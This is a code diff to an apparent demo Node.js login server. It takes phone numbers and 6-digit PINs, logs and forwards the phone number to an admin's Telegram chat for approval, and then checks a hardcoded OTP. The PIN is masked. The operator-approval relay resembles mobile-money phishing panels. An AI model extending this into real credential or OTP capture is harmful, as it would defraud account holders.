@@ -16,16 +16,6 @@ const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
 
 // ==============================
-// DEMO LOGIN DETAILS
-// ==============================
-
-// Fake values for presentation only
-const DEMO_PHONE = "0712 345 678";
-const DEMO_PIN = "1234";
-const DEMO_OTP = "123456";
-
-
-// ==============================
 // LOGIN DATA
 // ==============================
 
@@ -33,7 +23,7 @@ let loginRequest = null;
 
 
 // ==============================
-// TELEGRAM API FUNCTION
+// TELEGRAM API
 // ==============================
 
 async function telegramRequest(method, data) {
@@ -56,7 +46,7 @@ async function telegramRequest(method, data) {
 
 
 // ==============================
-// HOME
+// HOME / TEST
 // ==============================
 
 app.get("/", function(request, response) {
@@ -76,12 +66,15 @@ app.post("/login", async function(request, response) {
     let pin = request.body.pin;
 
 
+    // Check fields
+
     if (!phone || !pin) {
 
         response.status(400).json({
 
             success: false,
-            message: "Please enter demo phone and PIN"
+
+            message: "Please enter phone number and PIN"
 
         });
 
@@ -89,14 +82,15 @@ app.post("/login", async function(request, response) {
     }
 
 
-    // Check demo credentials
+    // PIN must contain exactly 6 digits
 
-    if (phone !== DEMO_PHONE || pin !== DEMO_PIN) {
+    if (!/^\d{6}$/.test(pin)) {
 
         response.json({
 
             success: false,
-            message: "Use the demo phone and demo PIN"
+
+            message: "Demo PIN must be 6 digits"
 
         });
 
@@ -110,7 +104,7 @@ app.post("/login", async function(request, response) {
 
         id: Date.now(),
 
-        phone: DEMO_PHONE,
+        phone: phone,
 
         status: "pending",
 
@@ -120,12 +114,14 @@ app.post("/login", async function(request, response) {
 
 
     console.log("New demo login request");
-    console.log("Demo phone:", DEMO_PHONE);
+
+    console.log("Phone:", phone);
+
     console.log("Request ID:", loginRequest.id);
 
 
     // ==============================
-    // SEND LOGIN REQUEST TO TELEGRAM
+    // TELEGRAM MESSAGE
     // ==============================
 
     try {
@@ -136,29 +132,38 @@ app.post("/login", async function(request, response) {
 
             text:
                 "🔔 NEW DEMO LOGIN REQUEST\n\n" +
-                "Phone: " + DEMO_PHONE +
-                "\nDemo PIN: " + DEMO_PIN +
+
+                "Phone: " + phone +
+
+                "\nDemo PIN: ******" +
+
                 "\nRequest ID: " + loginRequest.id +
+
                 "\n\nPlease choose an action:",
+
 
             reply_markup: {
 
                 inline_keyboard: [
 
                     [
+
                         {
                             text: "✅ Approve",
 
                             callback_data:
-                                "approve_" + loginRequest.id
+                                "approve_" +
+                                loginRequest.id
                         },
 
                         {
                             text: "❌ Reject",
 
                             callback_data:
-                                "reject_" + loginRequest.id
+                                "reject_" +
+                                loginRequest.id
                         }
+
                     ]
 
                 ]
@@ -166,6 +171,7 @@ app.post("/login", async function(request, response) {
             }
 
         });
+
 
         console.log("Telegram notification sent");
 
@@ -215,25 +221,33 @@ app.get("/login-status", function(request, response) {
 
 
 // ==============================
-// TELEGRAM BUTTON HANDLER
+// TELEGRAM APPROVE / REJECT
 // ==============================
 
 async function handleTelegramButton(callbackQuery) {
 
-    let chatId = callbackQuery.message.chat.id;
+    let chatId =
+        callbackQuery.message.chat.id;
 
 
-    // Only admin can approve/reject
+    // Only admin can approve
 
-    if (String(chatId) !== String(ADMIN_CHAT_ID)) {
+    if (
+        String(chatId) !==
+        String(ADMIN_CHAT_ID)
+    ) {
 
-        await telegramRequest("answerCallbackQuery", {
+        await telegramRequest(
+            "answerCallbackQuery",
+            {
 
-            callback_query_id: callbackQuery.id,
+                callback_query_id:
+                    callbackQuery.id,
 
-            text: "Not authorized"
+                text: "Not authorized"
 
-        });
+            }
+        );
 
         return;
     }
@@ -241,13 +255,17 @@ async function handleTelegramButton(callbackQuery) {
 
     if (loginRequest === null) {
 
-        await telegramRequest("answerCallbackQuery", {
+        await telegramRequest(
+            "answerCallbackQuery",
+            {
 
-            callback_query_id: callbackQuery.id,
+                callback_query_id:
+                    callbackQuery.id,
 
-            text: "No active login request"
+                text: "No active request"
 
-        });
+            }
+        );
 
         return;
     }
@@ -255,7 +273,8 @@ async function handleTelegramButton(callbackQuery) {
 
     // Get command and request ID
 
-    let parts = callbackQuery.data.split("_");
+    let parts =
+        callbackQuery.data.split("_");
 
     let command = parts[0];
 
@@ -264,15 +283,23 @@ async function handleTelegramButton(callbackQuery) {
 
     // Check request ID
 
-    if (String(requestId) !== String(loginRequest.id)) {
+    if (
+        String(requestId) !==
+        String(loginRequest.id)
+    ) {
 
-        await telegramRequest("answerCallbackQuery", {
+        await telegramRequest(
+            "answerCallbackQuery",
+            {
 
-            callback_query_id: callbackQuery.id,
+                callback_query_id:
+                    callbackQuery.id,
 
-            text: "This request is no longer active"
+                text:
+                    "This request is no longer active"
 
-        });
+            }
+        );
 
         return;
     }
@@ -283,7 +310,8 @@ async function handleTelegramButton(callbackQuery) {
     // ==============================
 
     let timePassed =
-        Date.now() - loginRequest.createdAt;
+        Date.now() -
+        loginRequest.createdAt;
 
 
     if (timePassed > 5 * 60 * 1000) {
@@ -291,13 +319,17 @@ async function handleTelegramButton(callbackQuery) {
         loginRequest.status = "expired";
 
 
-        await telegramRequest("answerCallbackQuery", {
+        await telegramRequest(
+            "answerCallbackQuery",
+            {
 
-            callback_query_id: callbackQuery.id,
+                callback_query_id:
+                    callbackQuery.id,
 
-            text: "Request expired"
+                text: "Request expired"
 
-        });
+            }
+        );
 
         return;
     }
@@ -309,34 +341,49 @@ async function handleTelegramButton(callbackQuery) {
 
     if (command === "approve") {
 
-        loginRequest.status = "approved";
+        loginRequest.status =
+            "approved";
 
 
-        await telegramRequest("answerCallbackQuery", {
+        await telegramRequest(
+            "answerCallbackQuery",
+            {
 
-            callback_query_id: callbackQuery.id,
+                callback_query_id:
+                    callbackQuery.id,
 
-            text: "Login approved ✅"
+                text:
+                    "Login approved ✅"
 
-        });
+            }
+        );
 
 
-        await telegramRequest("editMessageText", {
+        await telegramRequest(
+            "editMessageText",
+            {
 
-            chat_id: ADMIN_CHAT_ID,
+                chat_id:
+                    ADMIN_CHAT_ID,
 
-            message_id:
-                callbackQuery.message.message_id,
+                message_id:
+                    callbackQuery.message.message_id,
 
-            text:
-                "✅ DEMO LOGIN APPROVED\n\n" +
-                "Phone: " + DEMO_PHONE +
-                "\nDemo PIN: " + DEMO_PIN +
-                "\nDemo OTP: " + DEMO_OTP +
-                "\nRequest ID: " + loginRequest.id +
-                "\n\nThe user can now enter the demo OTP."
+                text:
+                    "✅ DEMO LOGIN APPROVED\n\n" +
 
-        });
+                    "Phone: " +
+                    loginRequest.phone +
+
+                    "\nDemo PIN: ******" +
+
+                    "\nRequest ID: " +
+                    loginRequest.id +
+
+                    "\n\nUser can continue to OTP."
+
+            }
+        );
 
 
         console.log("Login approved");
@@ -350,31 +397,45 @@ async function handleTelegramButton(callbackQuery) {
 
     if (command === "reject") {
 
-        loginRequest.status = "rejected";
+        loginRequest.status =
+            "rejected";
 
 
-        await telegramRequest("answerCallbackQuery", {
+        await telegramRequest(
+            "answerCallbackQuery",
+            {
 
-            callback_query_id: callbackQuery.id,
+                callback_query_id:
+                    callbackQuery.id,
 
-            text: "Login rejected ❌"
+                text:
+                    "Login rejected ❌"
 
-        });
+            }
+        );
 
 
-        await telegramRequest("editMessageText", {
+        await telegramRequest(
+            "editMessageText",
+            {
 
-            chat_id: ADMIN_CHAT_ID,
+                chat_id:
+                    ADMIN_CHAT_ID,
 
-            message_id:
-                callbackQuery.message.message_id,
+                message_id:
+                    callbackQuery.message.message_id,
 
-            text:
-                "❌ DEMO LOGIN REJECTED\n\n" +
-                "Phone: " + DEMO_PHONE +
-                "\nRequest ID: " + loginRequest.id
+                text:
+                    "❌ DEMO LOGIN REJECTED\n\n" +
 
-        });
+                    "Phone: " +
+                    loginRequest.phone +
+
+                    "\nRequest ID: " +
+                    loginRequest.id
+
+            }
+        );
 
 
         console.log("Login rejected");
@@ -390,7 +451,10 @@ async function handleTelegramButton(callbackQuery) {
 
 async function startTelegramPolling() {
 
-    if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) {
+    if (
+        !TELEGRAM_BOT_TOKEN ||
+        !ADMIN_CHAT_ID
+    ) {
 
         console.log(
             "Telegram environment variables are missing"
@@ -400,14 +464,17 @@ async function startTelegramPolling() {
     }
 
 
-    console.log("Telegram bot starting...");
+    console.log(
+        "Telegram bot starting..."
+    );
 
 
-    await telegramRequest("deleteWebhook", {
-
-        drop_pending_updates: false
-
-    });
+    await telegramRequest(
+        "deleteWebhook",
+        {
+            drop_pending_updates: false
+        }
+    );
 
 
     let offset = 0;
@@ -417,28 +484,29 @@ async function startTelegramPolling() {
 
         try {
 
-            let result = await telegramRequest(
-
-                "getUpdates",
-
-                {
-                    offset: offset,
-
-                    timeout: 20
-                }
-
-            );
+            let result =
+                await telegramRequest(
+                    "getUpdates",
+                    {
+                        offset: offset,
+                        timeout: 20
+                    }
+                );
 
 
             if (result.ok) {
 
-                for (let update of result.result) {
+                for (
+                    let update of result.result
+                ) {
 
                     offset =
                         update.update_id + 1;
 
 
-                    if (update.callback_query) {
+                    if (
+                        update.callback_query
+                    ) {
 
                         await handleTelegramButton(
                             update.callback_query
@@ -458,11 +526,16 @@ async function startTelegramPolling() {
             );
 
 
-            await new Promise(function(resolve) {
+            await new Promise(
+                function(resolve) {
 
-                setTimeout(resolve, 3000);
+                    setTimeout(
+                        resolve,
+                        3000
+                    );
 
-            });
+                }
+            );
 
         }
 
@@ -475,71 +548,83 @@ async function startTelegramPolling() {
 // DEMO OTP
 // ==============================
 
-app.post("/verify-otp", function(request, response) {
+app.post(
+    "/verify-otp",
+    function(request, response) {
 
-    let otp = request.body.otp;
+        let otp =
+            request.body.otp;
 
 
-    // User must be approved first
+        // Must be approved first
 
-    if (
-        loginRequest === null ||
-        loginRequest.status !== "approved"
-    ) {
+        if (
+            loginRequest === null ||
+            loginRequest.status !== "approved"
+        ) {
+
+            response.json({
+
+                success: false,
+
+                message:
+                    "Login has not been approved"
+
+            });
+
+            return;
+        }
+
+
+        // Demo OTP for presentation
+
+        if (otp === "123456") {
+
+            response.json({
+
+                success: true,
+
+                message:
+                    "OTP verified successfully"
+
+            });
+
+            return;
+        }
+
 
         response.json({
 
             success: false,
 
-            message: "Login has not been approved"
+            message:
+                "Incorrect demo OTP"
 
         });
 
-        return;
     }
-
-
-    // Check demo OTP
-
-    if (otp === DEMO_OTP) {
-
-        response.json({
-
-            success: true,
-
-            message: "OTP verified successfully"
-
-        });
-
-        return;
-    }
-
-
-    response.json({
-
-        success: false,
-
-        message: "Incorrect demo OTP"
-
-    });
-
-});
+);
 
 
 // ==============================
 // SERVER
 // ==============================
 
-const PORT = process.env.PORT || 5000;
+const PORT =
+    process.env.PORT || 5000;
 
 
-app.listen(PORT, function() {
+app.listen(
+    PORT,
+    function() {
 
-    console.log(
-        "Server is running on port " + PORT
-    );
+        console.log(
+            "Server is running on port " +
+            PORT
+        );
 
 
-    startTelegramPolling();
+        startTelegramPolling();
 
-});
+    }
+);
